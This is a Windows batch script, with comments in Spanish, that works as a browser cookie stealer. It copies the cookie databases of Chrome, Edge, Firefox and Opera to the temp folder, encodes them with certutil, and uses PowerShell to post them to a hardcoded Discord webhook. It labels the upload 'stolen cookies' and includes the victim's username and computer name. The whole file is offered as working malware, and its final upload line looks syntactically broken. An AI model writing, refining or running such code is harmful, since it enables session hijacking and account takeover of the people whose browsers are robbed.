@echo off
set webhook=https://discord.com/api/webhooks/1420127426175963166/-_7m-AIMwLDK31H8EgbQKJnT8CdGq83nKbG4G9PVNdjwpL96FWdALvIJUduT3l9OffGX

:: Chrome
if exist "%LOCALAPPDATA%\Google\Chrome\User Data\Default\Cookies" copy "%LOCALAPPDATA%\Google\Chrome\User Data\Default\Cookies" "%TEMP%\chrome_cookies.sqlite"

:: Edge
if exist "%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Cookies" copy "%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Cookies" "%TEMP%\edge_cookies.sqlite"

:: Firefox
for /d %%i in ("%APPDATA%\Mozilla\Firefox\Profiles\*") do if exist "%%i\cookies.sqlite" copy "%%i\cookies.sqlite" "%TEMP%\firefox_cookies.sqlite"

:: Opera
if exist "%APPDATA%\Opera Software\Opera Stable\Cookies" copy "%APPDATA%\Opera Software\Opera Stable\Cookies" "%TEMP%\opera_cookies.sqlite"

:: Enviar a Discord
powershell -c "IWR -Uri '%webhook%' -Method POST -Body (@{content='**COOKIES ROBADAS** de %USERNAME%@%COMPUTERNAME%'} | ConvertTo-Json) -ContentType 'application/json'"

:: Enviar archivos
for %%f in (%TEMP%\*_cookies.sqlite) do powershell -c "certutil -encode '%%f' '%TEMP%\%%~nf.txt'; $b = Get-Content '%TEMP%\%%~nf.txt' -Raw; IWR -Uri '%webhook%' -Method POST -Body (@{content='```%%~nf```'$b} | ConvertTo-Json) -ContentType 'application/json'"
